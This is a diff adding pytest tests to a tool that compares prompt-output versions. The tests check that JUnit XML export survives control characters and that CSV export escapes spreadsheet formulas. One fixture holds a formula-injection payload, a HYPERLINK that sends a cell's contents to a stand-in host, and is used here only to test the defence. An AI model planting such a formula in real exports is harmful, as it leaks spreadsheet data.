@@ -229,4 +229,63 @@ def test_cli_compare_exports(tmp_path, monkeypatch, no_keys, capsys):
     assert suite.findall("testcase")[0].get("classname") == "t"
     assert suite.findall("testcase")[1].get("classname") == "v1 vs v2"
     assert "<title>promptdrift: v1 vs v2</title>" in html_p.read_text(encoding="utf-8")
-    assert "CSV saved" in capsys.readouterr().out
+    captured = capsys.readouterr()
+    # --json keeps stdout a single JSON document; the status lines go to stderr
+    assert json.loads(captured.out)["version_b"] == "v2"
+    assert "CSV saved" in captured.err and "CSV saved" not in captured.out
+
+
+# ── review fixes: control characters, surrogates, spreadsheet formulas ────────
+def test_junit_replaces_characters_xml_forbids():
+    """ANSI colour codes, NUL, VT, FF and a lone surrogate used to make the file unparseable."""
+    rep = compare_outputs([
+        {"case_id": "c\x0b1", "input": "in \ud800 put", "output_a": "hello",
+         "output_b": "broken \x00 \x1b[31mred\x1b[0m \x07 \x0c", "tags": ["t\x00ag"],
+         "checks": {"regex": "hello"}},
+        {"case_id": "ok", "output_a": "x", "output_b": "x"},
+    ], version_a="v\x1b1", version_b="v2", bootstrap=0)
+    assert rep.cases[0].check_flip == "pass_to_fail"
+    xml = to_junit(rep)
+    root = ET.fromstring(xml)  # parses
+    tc = root.find("testsuite").findall("testcase")
+    assert tc[0].get("name") == "c\\x0b1" and tc[0].get("classname") == "t\\x00ag"
+    text = tc[0].find("failure").text
+    assert "\\x1b[31mred\\x1b[0m" in text and "\\x00" in text and "\\x07" in text
+    assert "in \\ud800 put" in text
+    props = {p.get("name"): p.get("value") for p in root.iter("property")}
+    assert props["version_a"] == "v\\x1b1"
+    # tab, newline and carriage return are legal and stay as they are
+    assert ex._xml_safe("a\tb\nc\rd�\U0001F600") == "a\tb\nc\rd�\U0001F600"
+    assert ex._xml_safe("￾￿") == "\\ufffe\\uffff"
+
+
+def test_save_junit_and_csv_survive_a_lone_surrogate(tmp_path):
+    rep = compare_outputs([{"case_id": "s", "input": "q", "output_a": "Thanks!",
+                            "output_b": "Thanks! \ud83d", "checks": {"regex": "^Thanks!$"}}],
+                          bootstrap=0)
+    save_junit(rep, tmp_path / "j.xml")
+    ET.parse(tmp_path / "j.xml")
+    save_csv(rep, tmp_path / "c.csv", include_outputs=True)
+    rows = list(csv.DictReader(io.StringIO((tmp_path / "c.csv").read_text(encoding="utf-8"))))
+    assert rows[0]["output_b"] == "Thanks! �"
+
+
+def test_csv_neutralises_spreadsheet_formulas():
+    rep = compare_outputs([
+        {"case_id": '=HYPERLINK("https://example.invalid/?d="&A2,"open")', "input": "=1+1",
+         "output_a": "+x", "output_b": "@SUM(1+1)", "tags": ["@SUM(1+1)"]},
+        {"case_id": "-1", "output_a": "\tx", "output_b": "plain", "tags": ["ok"]},
+        {"case_id": "normal", "output_a": "a", "output_b": "b"},
+    ], bootstrap=0)
+    rows = list(csv.DictReader(io.StringIO(to_csv(rep, include_outputs=True))))
+    assert rows[0]["case_id"].startswith("'=HYPERLINK(")
+    assert rows[0]["tags"] == "'@SUM(1+1)" and rows[0]["input"] == "'=1+1"
+    assert rows[0]["output_a"] == "'+x" and rows[0]["output_b"] == "'@SUM(1+1)"
+    assert rows[1]["case_id"] == "'-1" and rows[1]["output_a"] == "'\tx"
+    assert rows[1]["tags"] == "ok" and rows[1]["output_b"] == "plain"
+    assert rows[2]["case_id"] == "normal" and rows[2]["input"] == ""
+    # numeric columns are never touched (negative latency deltas stay numbers)
+    assert all(not r["drift_score"].startswith("'") for r in rows)
+    raw = list(csv.DictReader(io.StringIO(to_csv(rep, include_outputs=True,
+                                                 escape_formulas=False))))
+    assert raw[0]["input"] == "=1+1" and raw[1]["case_id"] == "-1"
